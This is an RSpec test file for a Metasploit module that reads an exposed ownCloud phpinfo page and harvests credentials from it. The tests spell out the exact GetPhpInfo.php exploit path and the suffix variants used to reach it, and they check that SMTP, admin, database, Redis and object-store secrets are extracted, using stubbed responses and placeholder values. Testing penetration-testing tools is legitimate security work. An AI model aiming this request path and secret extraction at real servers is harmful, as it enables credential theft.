require 'rspec'
require 'cgi'
require 'msfenv'
require 'msf/base'

RSpec.describe 'ownCloud phpinfo collection contracts' do
  let(:fixture_path) { File.expand_path('../../../file_fixtures/modules/auxiliary/owncloud_phpinfo', __dir__) }
  let(:body) { File.binread(File.join(fixture_path, 'native-sqlite.html')) }
  let(:credentials) { [] }
  let(:services) { [] }
  let(:messages) { [] }
  let(:warnings) { [] }
  let(:loot) { [] }
  let(:requests) { [] }
  let(:mod) { @framework.modules.create('auxiliary/gather/owncloud_phpinfo_reader') }

  before(:context) do
    # Real Framework loader, initialization, options, URI builder and failure
    # classes; no SQL connection, console or target service is started.
    @framework = Msf::Simple::Framework.create('DisableDatabase' => true, 'DeferModuleLoads' => true)
    path = ENV.fetch('OWNCLOUD_UNIT_MODULE_ROOT', File.expand_path('../../../../modules', __dir__))
    loader = @framework.modules.send(:loaders).find { |candidate| candidate.loadable?(path) }
    raise 'Could not load ownCloud module' unless loader.load_module(path, 'auxiliary', 'gather/owncloud_phpinfo_reader')
  end

  after(:context) do
    @framework.threads.each { |thread| thread.kill if thread&.alive? }
  end

  before do
    mod.datastore['RHOSTS'] = '192.0.2.1'
    allow(mod).to receive(:myworkspace_id).and_return(7)
    allow(mod).to receive(:print_good) { |message| messages << message }
    allow(mod).to receive(:print_bad)
    allow(mod).to receive(:vprint_warning) { |message| warnings << message }
    allow(mod).to receive(:elog)
    # These record public reporting arguments, not SQL persistence or login
    # authentication. DNS answers are deliberately reserved test addresses.
    allow(mod).to receive(:create_credential) { |data| credentials << data }
    allow(mod).to receive(:report_service) { |data| services << data }
    allow(mod).to receive(:store_loot) do |*data|
      loot << data
      '/unit/phpinfo.html'
    end
    allow(mod).to receive(:send_request_cgi) do |data|
      requests << data
      response(200, body)
    end
    allow(Rex::Socket).to receive(:getaddress) do |host|
      {
        '192.0.2.1' => '192.0.2.1', '127.0.0.1' => '127.0.0.1',
        'reporting_db' => '192.0.2.2', 'redis' => '192.0.2.3'
      }.fetch(host) { raise SocketError, 'Unit DNS name does not resolve' }
    end
  end

  it 'retains the actual public empty ROOT option contract' do
    mod.datastore['ROOT'] = ''

    expect([mod.options['ROOT'].valid?(''), mod.roots]).to eq([true, ['']])
  end

  it 'returns the explicit owncloud ROOT as one candidate' do
    mod.datastore['ROOT'] = 'owncloud'

    expect(mod.roots).to eq(['owncloud'])
  end

  %w[css js svg gif png html ttf woff ico jpg jpeg json properties min.map js.map auto.map].each do |suffix|
    it "runs the explicit #{suffix} ENDFILE through the real URI builder" do
      mod.datastore['TARGETURI'] = '/owncloud/'
      mod.datastore['ENDFILE'] = suffix

      mod.run

      expect(requests).to eq([{ 'uri' => "/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.#{suffix}" }])
    end
  end

  it 'uses both root candidates and all suffixes when no response exposes phpinfo' do
    allow(mod).to receive(:send_request_cgi) do |data|
      requests << data
      response(404, 'Synthetic missing application')
    end

    mod.run

    expect([requests.length, requests.first, requests.last, loot, credentials]).to eq([
      32,
      { 'uri' => '/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css' },
      { 'uri' => '/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.auto.map' },
      [], []
    ])
  end

  it 'stores the native response bytes without modifying the loot' do
    mod.run

    expect(loot).to eq([['owncloud.phpinfo', 'text/html', '192.0.2.1', body, 'phpinfo.html']])
  end

  it 'extracts the native SMTP password including its spaces and decoded entities' do
    mod.run

    expect(credentials).to include(include(service_name: 'SMTP', address: '127.0.0.1', port: 2525,
                                           username: 'module-mail-user', private_data: 'module-mail password & <encoded>'))
  end

  it 'reports the native ownCloud credential as harvested and untried' do
    mod.run

    expect(credentials).to include(include(service_name: 'ownCloud', address: '192.0.2.1', port: 8080,
                                           username: 'module-admin', private_data: 'module-target-owncloud-password',
                                           private_type: :password, protocol: 'tcp', workspace_id: 7,
                                           module_fullname: 'auxiliary/gather/owncloud_phpinfo_reader',
                                           origin_type: :service, status: Metasploit::Model::Login::Status::UNTRIED))
  end

  it 'does not treat the native no-value placeholders as credentials' do
    mod.run

    expect(credentials.length).to eq(2)
  end

  it 'reports the services associated with the harvested native credentials' do
    mod.run

    expect(services).to contain_exactly(
      include(host: '127.0.0.1', port: 2525, proto: 'tcp', name: 'SMTP'),
      include(host: '192.0.2.1', port: 8080, proto: 'tcp', name: 'ownCloud')
    )
  end

  it 'raises the existing reason-bearing auxiliary failure for no HTTP response' do
    allow(mod).to receive(:send_request_cgi).and_return(nil)

    expect { mod.run }.to raise_error(Msf::Auxiliary::Failed, /Could not connect to web service - no response/)
  end

  context 'with the native subpath deployment capture' do
    let(:body) { File.binread(File.join(fixture_path, 'native-prefix.html')) }

    it 'uses the explicit empty root at the native application base' do
      mod.datastore['TARGETURI'] = '/owncloud/'
      mod.datastore['ROOT'] = ''

      mod.run

      expect(requests).to eq([{ 'uri' => '/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css' }])
    end

    it 'decodes the native admin password exactly once before credential reporting' do
      mod.run

      expect(credentials).to include(include(service_name: 'ownCloud', private_data: 'module&<owncloud-password>'))
    end
  end

  context 'with the native PostgreSQL and Redis deployment capture' do
    let(:body) { File.binread(File.join(fixture_path, 'native-postgres.html')) }

    it 'associates the extracted database secret with its resolved host and actual port' do
      mod.run

      expect(credentials).to include(include(service_name: 'pgsql', address: '192.0.2.2', port: 5432,
                                             username: 'module_framework', private_data: 'module-target-framework-db-password'))
    end

    it 'associates Redis with its resolved host and actual port' do
      mod.run

      expect(credentials).to include(include(service_name: 'redis', address: '192.0.2.3', port: 6379,
                                             private_data: 'module-target-redis-password'))
    end

    it 'displays the actual database endpoint alongside its credential' do
      mod.run

      expect(messages.join("\n")).to include('reporting_db:5432')
    end

    it 'decodes the native configured object-store secret for the existing output contract' do
      mod.run

      expect(messages).to include('ObjectStore Secret: module-s3 secret & <encoded>')
    end

    it 'submits the same four untried service credential arguments on a second execution' do
      mod.run
      first = credentials.dup
      mod.run

      expect([first.length, credentials.drop(first.length)]).to eq([4, first])
    end

    it 'keeps other captured credentials when a database hostname is absent (synthetic mutation)' do
      with_field('OWNCLOUD_DB_HOST', nil)

      mod.run

      expect(credentials.map { |data| data[:service_name] }).to contain_exactly('SMTP', 'ownCloud', 'redis')
    end

    it 'keeps other captured credentials when a Redis port is absent (synthetic mutation)' do
      with_field('OWNCLOUD_REDIS_PORT', nil)

      mod.run

      expect(credentials.map { |data| data[:service_name] }).to contain_exactly('SMTP', 'ownCloud', 'pgsql')
    end

    it 'does not invent a database port when the captured host omits it (synthetic mutation)' do
      with_field('OWNCLOUD_DB_HOST', 'reporting_db')

      mod.run

      expect(credentials.map { |data| data[:service_name] }).to contain_exactly('SMTP', 'ownCloud', 'redis')
    end

    it 'handles a bracketed IPv6 database endpoint through the standard URI parser (synthetic mutation)' do
      with_field('OWNCLOUD_DB_HOST', '[2001:db8::2]:5432')
      allow(Rex::Socket).to receive(:getaddress).with('2001:db8::2').and_return('2001:db8::2')

      mod.run

      expect(credentials).to include(include(service_name: 'pgsql', address: '2001:db8::2', port: 5432))
    end

    it 'rejects a malformed database authority without losing other credentials (synthetic mutation)' do
      with_field('OWNCLOUD_DB_HOST', 'reporting_db:not-a-port')

      mod.run

      expect(credentials.map { |data| data[:service_name] }).to contain_exactly('SMTP', 'ownCloud', 'redis')
    end
  end

  context 'synthetic nullable and malformed response guards' do
    it 'does not collect a nil response body' do
      allow(mod).to receive(:send_request_cgi).and_return(response(200, nil))

      expect { mod.run }.not_to(change { [loot.length, credentials.length] })
    end

    it 'does not collect a non-success response containing phpinfo text' do
      allow(mod).to receive(:send_request_cgi).and_return(response(403, body))

      expect { mod.run }.not_to(change { [loot.length, credentials.length] })
    end

    it 'preserves a configured secret whose literal text is no value' do
      with_field('OWNCLOUD_MAIL_SMTP_PASSWORD', 'no value')

      mod.run

      expect(credentials).to include(include(service_name: 'SMTP', private_data: 'no value'))
    end

    it 'retains the original loopback SMTP fallback when its hostname is missing' do
      with_fields('OWNCLOUD_MAIL_SMTP_HOST' => nil, 'OWNCLOUD_MAIL_SMTP_PASSWORD' => 'module-smtp-password')

      mod.run

      expect(credentials).to include(include(service_name: 'SMTP', address: '127.0.0.1',
                                             username: 'module-mail-user', private_data: 'module-smtp-password'))
    end

    it 'keeps loot and other credentials when a captured hostname cannot be resolved' do
      with_field('OWNCLOUD_MAIL_SMTP_HOST', 'unresolvable.example.test')

      mod.run

      expect([loot.length, credentials.map { |data| data[:service_name] }, warnings.empty?]).to eq([1, ['ownCloud'], false])
    end

    it 'keeps other credentials when the resolver returns no address' do
      allow(Rex::Socket).to receive(:getaddress).with('127.0.0.1').and_return(nil)

      mod.run

      expect(credentials.map { |data| data[:service_name] }).to eq(['ownCloud'])
    end

    it 'retains the original SMTP port fallback when its port is missing' do
      with_fields('OWNCLOUD_MAIL_SMTP_PORT' => nil, 'OWNCLOUD_MAIL_SMTP_PASSWORD' => 'module-smtp-password')

      mod.run

      expect(credentials).to include(include(service_name: 'SMTP', port: 25,
                                             username: 'module-mail-user', private_data: 'module-smtp-password'))
    end

    it 'retains both original SMTP fallbacks when its host and port are missing' do
      with_fields('OWNCLOUD_MAIL_SMTP_HOST' => nil, 'OWNCLOUD_MAIL_SMTP_PORT' => nil,
                  'OWNCLOUD_MAIL_SMTP_PASSWORD' => 'module-smtp-password')

      mod.run

      expect(credentials).to include(include(service_name: 'SMTP', address: '127.0.0.1', port: 25,
                                             username: 'module-mail-user', private_data: 'module-smtp-password'))
    end

    it 'does not report a malformed captured port as a service' do
      with_field('OWNCLOUD_MAIL_SMTP_PORT', 'not-a-port')

      mod.run

      expect(credentials).not_to include(include(service_name: 'SMTP'))
    end
  end

  def response(status, content)
    result = Rex::Proto::Http::Response.new(status)
    result.body = content
    result
  end

  # Synthetic changes retain every other byte of the captured response. Whole
  # document HTML serialization would hide the original regex parser's behavior.
  def with_field(name, value)
    with_fields(name => value)
  end

  def with_fields(fields)
    changed = body.dup
    fields.each do |name, value|
      row = changed.lines.find { |line| line.start_with?("<tr><td class=\"e\">#{name} </td>") }
      raise "Missing captured field #{name}" unless row

      replacement = value.nil? ? '' : row.sub(%r{<td class="v">.*?</td>}) { "<td class=\"v\">#{CGI.escapeHTML(value)} </td>" }
      changed.sub!(row, replacement)
    end
    allow(mod).to receive(:send_request_cgi).and_return(response(200, changed))
  end
end
